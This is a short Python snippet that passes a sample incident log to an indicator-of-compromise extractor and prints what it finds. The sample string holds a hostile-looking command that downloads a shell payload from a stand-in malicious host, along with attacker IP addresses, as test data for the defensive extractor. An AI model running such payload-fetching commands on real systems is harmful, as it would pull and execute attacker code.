from app.ioc_extractor import extract_iocs
text = "47 failed logins from 185.220.101.45; wget http://malicious-example.xyz/payload.sh then connect to 203.0.113.66"
print(extract_iocs(text))